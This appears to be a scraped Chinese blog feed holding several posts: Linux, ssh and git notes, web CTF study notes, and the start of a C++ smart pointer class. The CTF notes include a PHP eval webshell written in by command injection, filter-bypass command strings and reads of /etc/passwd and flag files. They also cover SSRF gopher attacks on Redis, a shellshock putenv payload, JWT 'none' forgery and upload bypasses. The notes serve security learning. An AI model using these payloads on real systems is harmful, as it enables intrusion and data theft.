单引号中的内容会原样输出，不会执行、不会取变量；不加引号和双引号中的内容可以执行、可以取变量； 12echo 'hello, $name \\&quot;hh\\&quot;' # 单引号字符串，输出 hello, $name \\&quot;hh\\&quot;echo &quot;hello, $name \\&quot;hh\\&quot;&quot; # 双引号字符串，输出 hello, yxc &quot;hh&quot; 获取字符串长度 123echo ${#name} # 输出3name=&quot;hello, yxc&quot;echo ${name:0:5} # 提取从0开始的5个字符 2.默认变量在执行shell脚本时，可以向脚本传递参数。$1是第一个参数，$2是第二个参数，以此类推。特殊的，$0是文件名（包含路径）。例如： 12345#! /bin/bashecho &quot;文件名：&quot;$0echo &quot;第一个参数：&quot;$1echo &quot;第二个参数：&quot;$2echo &quot;第十个参数：&quot;${10} 然后执行该脚本： 12acs@9e0ebfcd82d7:~$ chmod +x test.sh acs@9e0ebfcd82d7:~$ ./test.sh 1 2 3 4 文件名：./test.sh第一个参数：1第二个参数：2 12345$# 代表文件传入的参数个数，如上例中值为4$* 由所有参数构成的用空格隔开的字符串，如上例中值为&quot;$1 $2 $3 $4&quot;$@ 每个参数分别用双引号括起来的字符串，如上例中值为&quot;$1&quot; &quot;$2&quot; &quot;$3&quot; &quot;$4&quot;$$ 脚本当前运行的进程ID$(command) 返回command这条命令的stdout（可嵌套） echo $(ls) 3.数组定义：数组用小括号表示，元素之间用空格隔开。例如：array=(1 abc “def” yxc)也可以直接定义数组中某个元素的值： 1234array[0]=1array[1]=abcarray[2]=&quot;def&quot;array[1000]=yxc 读取数组中某个元素的值 12${array[index]}${#array[*]} # 数组长度，类似于字符串 4.exprexpr命令用于求表达式的值,expr 表达式 1234用空格隔开每一项对包含空格和其他特殊字符的字符串要用双引号括起来expr会在stdout中输出结果。如果为逻辑关系表达式，则结果为真，stdout为1，否则为0。expr的exit code：如果为逻辑关系表达式，则结果为真，exit code为0，否则为1。 字符串表达式 1234str=&quot;Hello World!&quot;echo `expr length &quot;$str&quot;` # `command`或$(command)表示执行该命令，输出12echo `expr index &quot;$str&quot; aWd` # 输出7，下标从1开始,0表示不存在echo `expr substr &quot;$str&quot; 2 3` # 输出 ell 3为length 整数表达式() 可以该表优先级，但需要用反斜杠转义，也可以将特殊字符用引号引起来逻辑关系表达式 5.read命令(std::cin)raed name 12-p: 后面可以接提示信息-t：后面跟秒数，定义输入字符的等待时间，超过等待时间后会自动忽略此命令 6.echo(std::cout)echo -e “hello\\nworld” printf(跟c++完全一样，只是换成了空格)printf “%10d.\\n” 123 # 占10位，右对齐printf “%-10.2f.\\n” 123.123321 # 占10位，保留2位小数，左对齐printf “My name is %s\\n” “yxc” # 格式化输出字符串printf “%d * %d = %d\\n” 2 3 expr 2 \\* 3 # 表达式的值作为参数 7.test||和&amp;&amp;是bash自带的test命令用exit code返回结果，而不是使用stdout。0表示真，非0表示假。 12test 2 -lt 3 # 为真，返回值为0echo $? # 输出上个命令的返回值，输出0 12345二者具有短路原则：可用其实现if else expr1 &amp;&amp; expr2：当expr1为假时，直接忽略expr2expr1 || expr2：当expr1为真时，直接忽略expr2test -e test.sh &amp;&amp; echo &quot;exist&quot; || echo &quot;Not exist&quot;test -e test2.sh &amp;&amp; echo &quot;exist&quot; || echo &quot;Not exist&quot; 文件类型判断 123test -e filename # 判断文件是否存在-f 是否为文件-d 是否为目录 文件权限判断 1234test -r filename # 判断文件是否可读-w 文件是否可写-x 文件是否可执行-s 是否为非空文件 整数间的比较 123456test $a -eq $b # a是否等于b-ne a是否不等于b-gt a是否大于b-lt a是否小于b-ge a是否大于等于b-le a是否小于等于b 字符串比较 1234test -z STRING 判断STRING是否为空，如果为空，则返回truetest -n STRING 判断STRING是否非空，如果非空，则返回true（-n可以省略）test str1 == str2 判断str1是否等于str2test str1 != str2 判断str1是否不等于str2 8.文件判断123456789101112131415161718192021-a FILE 如果文件存在则为真。-b FILE 如果文件是块状的，则为真。-c FILE 如果文件是特殊字符，则为真。-d FILE 如果文件是一个目录，则为真。-e FILE 如果文件存在则为真。-f FILE 如果文件存在并且是一个普通文件，则为真。-g FILE 如果文件是set-group-id，则为真。-h FILE 如果文件是一个符号链接，则为真。-L FILE 如果文件是一个符号链接，则为真。-k FILE 如果文件的 “粘性 “位被设置，则为真。-p FILE 如果文件是一个命名的管道，则为真。-r FILE 如果文件可以被你读取，则为真。-s FILE 如果文件存在并且不是空的，则为真。-S FILE 如果文件是一个套接字，则为真。-t FD 如果FD在一个终端上打开，则为真。-u FILE 如果文件是设置了用户身份的，则为真。-w FILE 如果文件可以被你写入，则为真。-x FILE 如果文件可由你执行，则为真。-O FILE 如果文件由你有效拥有，则为真。-G FILE 如果该文件由你的小组有效拥有，则为真。-N FILE 如果文件在上次被读取后被修改，则为真。 9.函数在函数内，$1表示第一个输入参数，$2表示第二个输入参数，依此类推。注意：函数内的$0仍然是文件名，而不是函数名。 123456789101112131415161718192021222324func() { # 递归计算 $1 + ($1 - 1) + ($1 - 2) + ... + 0 word=&quot;&quot; while [ &quot;${word}&quot; != 'y' ] &amp;&amp; [ &quot;${word}&quot; != 'n' ] do read -p &quot;要进入func($1)函数吗？请输入y/n：&quot; word done if [ &quot;$word&quot; == 'n' ] then echo 0 return 0 fi if [ $1 -le 0 ] then echo 0 return 0 fi sum=$(func $(expr $1 - 1)) echo $(expr $sum + $1)}echo $(func 10) 10.文件重定向(读写)read &lt; inputfileecho &gt; outputfile 1234567891011#! /bin/bashinputfile=$1outputfile=$2read n &lt; $inputfilesum=0for ((i=1;i&lt;=n;i++))do sq=$(expr $i \\* $i) sum=$(expr $sum + $sq)doneecho $sum &gt; $outputfile 11.引用外部脚本source test.sh 四、ssh远程登录服务器 12ssh user@hostiplogout #退出 第一次登录时会提示：(注意是为了防止登录到一些有害的服务器) 123The authenticity of host '123.57.47.211 (123.57.47.211)' can't be established.ECDSA key fingerprint is SHA256:iy237yysfCe013/l+kpDGfEG9xxHxm0dnxnAbJTPpG8.Are you sure you want to continue connecting (yes/no/[fingerprint])? 输入yes，然后回车即可。这样会将该服务器的信息记录在~/.ssh/known_hosts文件中。(信息泄露)然后输入密码即可登录到远程服务器中。ssh的默认登录端口号为22。如果想登录某一特定端口，加入-p 端口号 1.配置文件创建文件 ~/.ssh/config。 1234567Host myserver1 HostName IP地址或域名 User 用户名Host myserver2 HostName IP地址或域名 User 用户名 之后再使用服务器时，可以直接使用别名myserver1、myserver2。不用user@ip了 2.密钥登录创建密钥：ssh-keygen然后一直回车即可。执行结束后，~/.ssh/目录下会多两个文件： 12id_rsa：私钥id_rsa.pub：公钥 之后想免密码登录哪个服务器，就将公钥传给哪个服务器即可。例如，想免密登录myserver服务器。则将公钥中的内容，复制到myserver中的~/.ssh/authorized_keys文件里即可。也可以使用如下命令一键添加公钥：ssh-copy-id myserver 3.批量化处理多台服务器ssh user@hostname command 12# 单引号中的$i可以求值ssh myserver 'for ((i = 0; i &lt; 10; i ++ )) do echo $i; done' 4.scp12345scp source1 source2 destination # source和destination可以是本地和服务器scp -r ~/tmp myserver:/home/acs/ #注意-r的位置scp -P 22 source1 source2 destination #注意大P的位置使用scp配置其他服务器的vim和tmuxscp ~/.vimrc ~/.tmux.conf myserver: 五.git 12345678910111213141516git config --global user.name xxx：设置全局用户名，信息记录在~/.gitconfig文件中git init --initial-branch=maingit add #添加到暂存区git commit #添加到版本库的一个版本git diff XX #查看XX文件相对于暂存区(若暂存区是空，则是HEAD)修改了哪些内容git restore readme.txt #将工作区的文件恢复到暂存区的状态，若暂存区是空，则恢复到HEAD的状态git restore --staged readme.txt #把文件从暂存区删除，staged即为暂存区git log #查看版本从起点到HEAD的路线 git reflog #查看HEAD指针的移动历史（包括被回滚的版本） git reset --hard HEAD^ 或 git reset --hard HEAD~：将代码库回滚到上一个版本，但并不会删除新版本git reset --hard HEAD^^：往上回滚两次，以此类推git reset --hard HEAD~100：往上回滚100个版本git reset --hard 版本号：回滚到某一特定版本若想回到新版本，可用版本号git reset,版本号即哈希值的前七位(可通过gitref来找HEAD走过的节点)git remote add origin git@git.acwing.com:zhangsx/linux.git #用户名@服务器ip git push -u origin 分支名 #默认都是master分支 git是通过ssh和scp来访问和传文件的SSH 公钥，通常包含在文件 ‘/.ssh/id_ed25519.pub’ 或 ‘/.ssh/id_rsa.pub’ 中，并以“ssh-ed25519”或“ssh-rsa”开头 多分支多人开发一般不会在主分支开发，所有分支共用一个暂存区 12345678git checkout -b branch_name #创建并切换到branch_name这个分支git branch #查看所有分支和当前所处分支git checkout branch_name #切换到branch_name这个分支git merge branch_name #将分支branch_name合并到当前分支上,实质是指针改变了,branch1没删除git branch -d branch_name #删除本地仓库的branch_name分支git push -u branch1 #要把分支也push上去git push -d branch1 #删除云端分支git pull origin branch_name #将远程仓库的branch_name分支与本地仓库的当前分支合并 两个分支都修改了readme.txt git stash栈12345git stash #将工作区和暂存区中尚未提交的修改存入栈中git stash apply #将栈顶存储的修改恢复到当前分支，但不删除栈顶元素git stash drop #删除栈顶存储的修改git stash pop #将栈顶存储的修改恢复到当前分支，同时删除栈顶元素git stash list #查看栈中所有元素 六、apache thrift(remote procedure call)解耦合的微服务框架，不同服务既可以在同一个服务器，也可以在不同服务器上。thrift提供通信服务(类似socket)，即服务器调用另外一台服务器的进程创建thrift文件夹存储所有thrift提供的接口编译： 12g++ -c main.cpp match_server/*.cppg++ *.o -o main -lthrift #需要用到thrift的动态链接库 git时最好不要把.o和二进制文件加进去生成的py文件有个Match-remote是用于服务端的，但我们只需要实现客户端，所以直接删掉服务端除了有一个线程去增减用户，还要有一个线程不断匹配用户，所以需要并行一个玩家匹配的时间越久，匹配的范围应该越大生产者-消费者模型：消费者不停消耗任务(死循环)生产者就是add_user和remove_user生产者和消费者之间的通信媒介：如消费队列(锁mutex) 123mutex m;p(m)//p操作表示争取这个锁，一旦争取到的话就可以行动v(m)//其他进程被阻塞 比如不能同时读写head条件变量(condition_variable)对锁进行了封装线程可能同时执行，即恰好同时加到了同一个head如两个线程同时执行，一个add拿了锁,一个remove会卡死在unique_lock直到拿锁的线程执行完刚开始时队列大概率是空，就获得锁，执行完就解锁，就会死循环，所以如果是空是就把这个进程按住，直到非空定义好的接口在 总结参考资料1.acwing2.acwing linux基础课","link":"/2022/04/14/acwing%20linux/"},{"title":"webCTF记录","text":"摘要：本文记录刷过的web题 一、xctfsimple pHppHp tricks: 1231.php中字符与与数字比较大小时，会省略字符2.is_numeric 只要有字符出现就是false3.pHp弱类型比较：==是松散比较，只比较值不比较类型，===是严格比较，比较值和类型 123456php中其中两种比较符号:字符串和数字比较使用==时,字符串会先转换为数字类型再比较var_dump('a' == 0);//true，此时a字符串类型转化成数字，因为a字符串`开头中没有找到数字`，所以转换为0var_dump('123a' == 123);//true，这里'123a'会被转换为123var_dump('a123' == 123);//false，因为php中有这样一个规定：字符串的开始部分决定了它的值，如果该字符串以合法的数字开始，则使用该数字至和它连续的最后一个数字结束，否则其比较时`整体值为0`。$a即a为真，a不能是数字0 所以最终url为http://111.198.29.45:44663/?a=a&amp;b=1235a get_postburp一键变更请求类型(注意a仍为get)其中content-length只有post才会有，所以要把其改成3 xff_refererX-Forwarder-For：改变发送请求的IPReferer：源地址，如题目要求必须来自https://www.google.com webshell首先存在一个名为shell的变量，shell的取值为HTTP的POST方式。Web服务器对shell取值以后，然后通过eval()函数执行shell里面的内容。可以将以上代码写入webshell.php文件中然后放在站点目录下通过浏览器访问，以POST方式传入shell=phpinfo();也可以用蚁剑或菜刀等工具连接(我这里用的是蚁剑)：在url地址框中输入http://127.0.0.1/webshell.php，在连接密码框中输入shell 12eval() 函数把字符串按照 PHP 代码来执行assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。 pHp一句话马 不用菜刀做法：用burp输入shell = system(“find / -name ‘flag*’”);system(“Linux命令”),相当于开了个linux终端(/为根目录，/home,/user)查看 Response，最下方有目标文件路径shell = system(“cat /var/www/html/flag.txt”);cat命令是linux下的一个文本输出命令，通常是用于观看某个文件的内容的 也可以一次性执行多行代码： 1shell=echo'&lt;pre&gt;';(echo单双引号均可)效果是出现个方框 grep 查找文件里符合条件的字符串 pingos命令执行漏洞发现实际上是输入了一个命令的参数 12345windows或linux下命令执行command1 &amp; command2 ：不管command1执行成功与否，都会执行command2（将上一个命令的输出作为下一个命令的输入），也就是command1和command2都执行command1 &amp;&amp; command2 ：先执行command1执行成功后才会执行command2，若command1执行失败，则不执行command2command1 | command2 ：只执行command2command1 || command2 ：command1执行失败，再执行command2(若command1执行成功，就不再执行command2) simple js“\\x49\\x51\\x5a\\x56\\x54”是C/C++ 里普通的转义字符。直接用cout 或者 printf 就能显示出来。发现是55,56,54,79,115,69,114,116,107,49,50var n = String.fromCharCode(65);//n = A ,将 Unicode 编码转为一个字符 123456js中的连等号顺序：多次赋值与顺序无关，是同时进行赋值的每个节点的变量最终赋值的值取决去最后一个等号的右边值如果赋值是引用类型，则最终指向的是同一个对象JavaScript数组越界访问不会报错，只会返回undefined。 代码审计发现结果只与pass有关，即输出FAUX PASSWORD HAHA，与输入无关另一个有意义的字符就是string里的了，想到把pass换成string执行一下,p += chr(int(t2[17]))要换成string的最后一个exp如下： pHp2 注意：这里需要将admin进行二次编码才可成功，因为浏览器会自动进行一次url解码，解码之后传递给代码相当于没进行编码，还是admin 最后，又去看了一下御剑，发现我的字典里没有.phps结尾的，能扫出来就怪了。–御剑的能力取决于字典 12.phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。它的MIME类型为：text/html, application/x-httpd-php-source, application/x-httpd-php3-source ics-06爆破idintruder payload 选number Web_php_unserialize12345pHp的class1、__construct()：当对象创建（new）时会自动调用。但在 unserialize() 时是不会自动调用的。（构造函数）2、__destruct()：当对象被销毁时会自动调用。（析构函数）3、__wakeup()：unserialize() 时会自动调用4.正则表达式匹配preg_match() 函数 告诉我们，这个flag在fl4g.php这个页面中，如果Demo类被销毁，那么就会高亮显示file所指向的文件的内容。/[oc]:\\d+:/i研究[OC]：正则表达式以o或c开头 12345正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。\\d: 匹配一个数字字符。等价于 [0-9]。 +: 匹配前面的子表达式一次或多次。例如，'zo+' 能匹配 &quot;zo&quot; 以及 &quot;zoo&quot;，但不能匹配 &quot;z&quot;。+ 等价于 {1,}。/i: 表示匹配的时候不区分大小写 __wakeup的绕过:当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行,所以只要把O:4:“Demo”:1:{s:10:“Demofile”;s:8:“fl4g.php”;}中的1那改成任意比他大的数即可 二、ctfhub1.HTTP 请求方法GET, POST 和 HEAD方法。OPTIONS, PUT, DELETE, TRACE 和 CONNECT 方法 12345678910OPTIONS返回服务器针对特定资源所支持的HTTP请求方法，也可以利用向web服务器发送‘*’的请求来测试服务器的功能性PUT向指定资源位置上传其最新内容DELETE请求服务器删除Request-URL所标识的资源TRACE回显服务器收到的请求，主要用于测试或诊断CONNECTHTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。 2.HTTP临时重定向返回302响应码，临时跳转到location注意burp要开启拦截服务器响应 3.基础认证基本认证（Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式在进行基本认证的过程里，请求的HTTP头字段会包含Authorization字段，形式如下： Authorization: Basic &lt;凭证&gt;，该凭证是用户和密码的组和的base64编码。如 123GET /private/index.html HTTP/1.0Host: localhostAuthorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ== 缺点：基本认证并没有为传送凭证（transmitted credentials）提供任何机密性的保护。仅仅使用 Base64 编码并传输，而没有使用任何 加密 或 散列算法。因此，基本认证常常和 HTTPS 一起使用，以提供机密性。密码爆破，要去掉有效载荷编码 4.xssurl编解码：我们都知道Http协议中参数的传输是”key=value”这种简直对形式的，如果要传多个参数就需要用“&amp;”符号对键值对进行分割。如”?name1=value1&amp;name2=value2”，这样在服务端在收到这种字符串的时候，会用“&amp;”分割出每一个参数，然后再用“=”来分割出参数值。取出value时会进行url解码(hello不管解多少次都是hello)send相当于机器人自动点击我们提交的网址 5.信息泄露git1234567891011121314目录扫描发现/.git---pip3 install GitHackergithacker --url http://127.0.0.1/.git/ --output-folder result--brute #暴力破解所有可能的branch名---kali里运行python2 GitHack.py http://www.example.com/.git/---git loggit stash listgit indexgit branch.git/config文件可能含有access_token可以访问该用户其他仓库 svn(subversion)、hg、cvs、bzr神器dvcs-ripper 1234567docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper 命令命令有：rip-git.pl -v -u http://www.example.com/.git/ 或者 rip-git.pl -s -v -u http://www.example.com/.git/rip-hg.pl -v -u http://www.example.com/.hg/ 或者 rip-hg.pl -s -v -u http://www.example.com/.hg/rip-bzr.pl -v -u http://www.example.com/.bzr/rip-svn.pl -v -u http://www.example.com/.svn/rip-cvs.pl -v -u http://www.example.com/CVS/ svn和git的区别： 1234561.git是分布式的，有本地和远程两个版本库，SVN是集中式，只有一个远程版本库；2.git的内容是按元数据方式存贮，所有控制文件在.git中，svn是按文件处理，所有资源控制文件在.svn中；3.svn的分支是一个目录，git不是；4.git没有一个全局的版本号，svn有；5.git内容存贮是使用SHA-1哈希算法，能确保代码完整性;6.git 有工作区，暂存区，远程仓库，git add将代码提交到暂存区， commit提交到本地版本库，push推送到远程版本库。svn是add 提交到暂存，commit是提交到远程版本库。 试图从 wc.db 中找到 flag, 尝试访问结果文件名发现被删除了。 1cat wc.db | grep -a flag 转而寻找 .svn/pristine/ 中的文件，找到 flag.svn目录(制作字典)： 123456├── pristine 各个版本纪录，这个文件一般较大├── tmp ├── entries 当前版本号├── format 文本文件， 放了一个整数，当前版本号├── wc.db 二进制文件├── wc.db-journal 二进制文件 参考 .DS_Store.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。直接cat .DS_Store 备份文件1234name = ['web','website','backup','back','www','wwwroot','temp']ext = ['tar','tar.gz','zip','rar']index.php.bak.index.php.swp #恢复方法是先用vim创建一个index.php,再vim -r index.php 6.口令爆破弱口令看到后台想到用户名为admin 默认口令百度社工 总结要边做题边总结出自己的字典 7.sql注入用sqlmap的url一定要有参数?id=1,无脑y cookie–level 2：等级2以上才会检测cookie注入–cookie:id=1 ：可能可注入的参数 ua–level 3:等级3以上才会检测ua注入burp抓包得到的数据放进a.txt 1sqlmap -r “a.txt” -p “User-Agent”(注意不能有-u了) referer注入–level 5burp抓包得到的数据发现没有Refer请求头，添加Refer请求头放进b.txt注入命令 1sqlmap -r &quot;b.txt&quot; --level 5 -p &quot;referer&quot; 绕过空格sqlmap自带space2comment.py 脚本，用法是–tamper “space2comment.py” sqlmap 中的 tamper 脚本有很多，例如： equaltolike.py （作用是用like代替等号）、 apostrophemask.py （作用是用utf8代替引号）、 greatest.py （作用是绕过过滤’&gt;’ ,用GREATEST替换大于号）等。 8.文件上传菜刀蚁剑这些必须用_POST[]传为什么要上传PHP木马而不是JSP,ASPX的木马 1234通过环境来看，基本判断方式有以下几种：1.看文件后缀 #如网页显示 xxxx.com/index.php,或者右键源代码中，表单提交action=&quot;upload.php&quot;2.插件检测（Wappalyzer插件）#可以检测当前页面的基础环境，如中间件，前后端语言等3.响应包判断 #看响应包如burpsuite的响应包如下：X-Powered-By: PHP/7.3.14 步骤： 1231.先看前端绕过2.大小写、'php '、'php.'、'php::$DATA'(网站服务器是windows才行) .htaccess.htaccess文件(在www文件夹)是Apache服务器中的一个配置文件，用于控制它所在的目录以及该目录下的所有子目录。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能源代码如下，用黑名单禁止了php上传，但我们可以写个黑名单没有的.htaccess文件上传到upload目录从而控制该目录，至于原目录的.htaccess会被覆盖掉 123move_uploaded_file() 函数将上传的文件移动到新位置。若成功，则返回 true，否则返回 false .(本函数仅用于通过 HTTP POST 上传的文件。)注意：如果目标文件已经存在，将会被覆盖。 在低于2.3.8版本时，因为默认AllowOverride为all，可以尝试上传.htaccess文件修改部分配置 12345678方法一：&lt;FilesMatch &quot;文件名的部分&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt;方法二：AddHandler php5-script .php# 在文件拓展名和解释器之间建立映射# 指定拓展名为.php的文件应被php5-script解释 00截断%00 , 0x00 , /00 都属于00截断,利用的是服务器的解析漏洞(ascii中0表示字符串结束),所以读取字符串到00就会停止,认为已经结束。_FILE[‘name’]会自动进行一次截断，所以上传的文件无法用00截断，但抓包发现road是通过_GET得到的，而_GET不会自动截断，所以可以用00截断掉$des后面的内容，让$des为upload/test.phpjdk7u40版本以下存在00截断，以上的版本会调用File的isInvalid()判断文件名是否合法(是否存在\\0)。PHP低于5.4版本时，如果用iconv()函数把utf8的字符转换成其他类型，而且转换的字符不在utf8的单字节范围(0x00-0x7F)内，转换时就会把其和后面的字符截断。php高于5.4时会返回fasle MIME绕过在HTTP中MIME类型被定义header的Content-Type中。此处便是我们进行绕过检测成功上传的核心 文件头检测随便找张png,上传抓包,只保留文件头几行的内容，后面的全删掉(太多内容蚁剑就连不上了)，然后在最后一行加上php代码，再改下文件后缀名 .user.ini局限：只有当前目录有php文件被执行时才会加载当前目录的.user.ini 9.Rce(远程命令执行)windows:%0a、&amp;、|(忽略前一个)、&amp;&amp;、||(忽略后一个)、%1a(一个神奇的角色,作为.bat文件中的命令分隔符)linux中:; 、&amp; 、| 、&amp;&amp;、|| 、%0a、%0d经测试这里可以使用%0a(注意不能直接在框里输入，而是url或者抓包)windows转义字符为’^’,Linux转义字符为’'windows注释为::，Linux注释为#linux的%0a到了windows要转成%0d%0a(回车) 管道符号，符号为|一条竖线，command 1 | command 2 他的功能是把第一个命令command 1执行的结果作为command 2的输入传给command 2。而且命令 2 只能处理命令 1 的正确输出，而不能处理错误输出。 文件包含可以包含含有php代码的txt文件等，php代码会在传参后的页面执行php伪协议：php://此时php://input相当于一个文件allow_url_fopen = On 是否允许打开远程文件 allow_url_include = On 是否允许include/require远程文件php://filter/read=convert.base64-encode/resource=/flag 命令注入直接cat 7672134566268.php发现无回显一般遇见这种情况 咱们首先考虑两种方法 第一种，直接查看源代码果不其然 直接在源代码中找到了第二种方法是将文件内容base64编码出来127.0.0.1&amp;cat 7672134566268.php| base64第三种方法是写shell(echo &gt;输出重定向把echo的参数输出到某个文件) 12127.0.0.1&amp;echo -e &quot;&lt;?php @eval(\\$_POST['test']);?&gt;&quot; &gt; 555.php#$前必须有转义符，否则双引号里的$会被认为是sh脚本的变量 绕过cat等关键字12345127.0.0.1&amp;a=c;b=at;$a$b flagxxxx.phpca''tc\\atc$*at或者用其他命令：head、tail等 过滤空格如果空格也过滤掉，我们同样可以通过burp来fuzz可以用的字符。&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、${IFS}等 过滤目录分割符/用cd一层层进入，用;分隔命令 10.ssrf攻击目标：内网原因：服务端允许从外部获取资源，但没对目标url、协议作过滤和限制这里的url相当于我们构造了一个url让服务器去访问 1234file:///etc/passwd #伪协议 读源码dict://172.26.0.2:6379/info #获取服务器运行的服务版本gopher:// #可向服务器发送任意内容(http,mysql等)http://127.0.0.1/flag.php #内网访问 攻击方式一.内部服务资产探测二.gopher协议扩展攻击面1.redis内网，127.0.0.1:6379,一般空口令。任意增删查改，利用导出功能写入crontab/webshell/ssh公钥如果一条指令是错误的，会自动读取下一条，直到是正确的redis指令反弹shell:控制端监听某个端口，被控制端发起请求到该端口，并将命令行的输入输出传到控制端crontab命令：常见于Unix和类Unix的操作系统之中，用于设置周期性被执行的指令。该命令从标准输入设备读取指令，并将其存放于“crontab”文件中，以供之后读取和执行。2.mysql3.php-fpm(fastcgi协议)4.内网web应用 绕过1234http://www.baidu.com@127.0.0.1①②③④⑤⑥⑦⑧⑨⑩ ? ? ? ? ? ? ? ? ? ? 。localhost &gt;&gt;&gt; 127.0.0.1127.0.0.1.xip.io &gt;&gt;&gt; 127.0.0.1(子域名重定向,国内无效) DNS重绑定网站，我的理解是生成了一个域名，访问这个域名就相当于访问输入的两个ip访问得通的那个 工具抓包改包太麻烦？推荐Gopherus,不过只能linux 123gopherus --exploit fastcgigopherus --exploit mysqlgopherus --exploit redis 伪协议读取文件一般遇到SSRF时，先测试所有的url协议 123456file:///dict://sftp://ldap://tftp://gopher:// 网站的根目录一般在/var/www/html POST请求POST请求必备(注意要空行)： 123456POST /flag.php HTTP/1.1Host: 127.0.0.1:80Content-Type: application/x-www-form-urlencodedContent-Length: 36key=2107c7378d01a54efbed766eece23e66 gopher://127.0.0.1:80/_内容(比如POST请求)注意：1.要经过2次url编码，第一次是网址传进去自动解码，第二次是curl方法还会解码一次2.POST请求和gopher的端口号3.Content-Length4.%0a要换成%0d%0a FastCGI协议和redis协议做这道题又踩了转义的坑，以及gopherus的payload要url编码一次才能输入网址如果不确定命令正确性，最好是在本地环境试着执行一下输入文件的命令而且php里的eval参数最好不要有引号(纯数字) 11.php绕过disable_function在已获得webshell但被PHP的disable_function禁用了一些危险函数的命令执行phpinfo可查看禁用的函数发现system被禁用，即无法执行终端命令，必须绕过蚁剑下载插件绕过disabled functions(梯子) LD_PRELOAD12341.编写好动态链接库文件并上传到服务器2.编写PHP文件并上传到服务器，内容为利用putenv设置LD_PRELOAD为我们的恶意动态链接库文件的路径，然后 配合php的某个函数（例如error_log()或mail()函数）去触发运行动态链接库并执行我们的恶意动态链接库文件的某个函数3.在浏览器访问执行我们写的PHP文件 程序中我们经常要调用一些外部库的函数，以sendmail程序中的geteuid()为例，如果我们有个自定义的geteuid()函数，把它编译成动态库后，通过LD_PRELOAD加载，当程序中调用geteuid()函数时，调用的其实是我们自定义的geteuid()函数。而在PHP中error_log()和mail()函数在传入特定参数时都会调用到sendmail外部程序进而调用外部库的函数geteuid()。 shellshock如果连不上可以试着换编码原理我们写入shell.php文件通过putenv来设置环境变量，默认putenv定义的环境变量名必须以PHP_开头。putenv(&quot;PHP_test=() { :; }; tac /flag &gt;&gt; /var/www/html/test.php&quot;);error_log(“admin”,1)函数触发payload Apache Mod CGI CGI简单说来便是放在服务器上的可执行程序,CGI编程没有特定的语言,C语言,linux shell,perl,vb等等都可以进行CGI编程.MOD_CGI：任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中.绕过条件： 123456第一，必须是apache环境第二，mod_cgi已经启用第三，必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none第四，必须有权限写.htaccess文件第五，如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令。比如将所有.ant后缀的文件作为cgi脚本执行 php-fpmlocalhost:9000蚁剑连接http://challenge-03491d0d67fc0dd3.sandbox.ctfhub.com:10800/.antproxy.php jwt(类似cookie)基础知识解码 无签名一些JWT库也支持none算法，即不使用签名算法。当alg字段为none时，后端将不执行签名验证。若能抓包抓到，可改alg和身份，后面的签名直接删掉。如token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxIiwicm9sZSI6ImFkbWluIn0.如果base64解码的最后面不对，可以添加等于号。因为JWT采取的是base6url编码，如果有等于号会被省略。 弱秘钥对称加密：加密和解密用的秘钥是一样的工具：c-jwt-cracker（需要在kali上面运行） 123systemctl restart docker #报错时重启docker build . -t jwtcrackdocker run -it --rm jwtcrack + 题目的token 修改签名算法有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的 三、HackingLab 网络信息安全攻防学习平台1.脚本关通过&lt;script&gt;window.location=&quot;./no_key_is_here_forever.php&quot;; &lt;/script&gt;重定向了script的src 属性规定外部脚本文件的 URL。 2.XSS基础3:检测与构造查看哪些标签关键词没有被过滤,建议准备一个txt文件专门用于检测未被过滤函数（burp就可以做）最后构造出Welcome 123反射型：搜索存储型：留言板dom:有道翻译 xss绕过","link":"/2022/05/02/webCTF%E8%AE%B0%E5%BD%95/"},{"title":"智能指针类","text":"用C++实现一个简单的智能指针类，构造，析构，拷贝构造，赋值=函数,指向-&gt; 一、智能指针类代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167#include &lt;iostream&gt;using namespace std;// 实现一个简单的智能指针，利用模板实现泛型编程//需要一个count来进行引用计数，由于这个count值需要指向同一个对象的指针共享，所以将其放在堆上template &lt;class T&gt;class MySharedPtr{private: int* count; // 引用计数 T* ptr; // 指针对象public: MySharedPtr(T* p = nullptr); // 默认构造函数 MySharedPtr(const MySharedPtr&lt;T&gt;&amp; ohter);//拷贝构造 ~MySharedPtr(); T* operator-&gt;();//重载了-&gt; MySharedPtr-&gt; 等价于 ptr-&gt; T&amp; operator*(); MySharedPtr&lt;T&gt;&amp; operator=(MySharedPtr&lt;T&gt;&amp; other);//拷贝构造 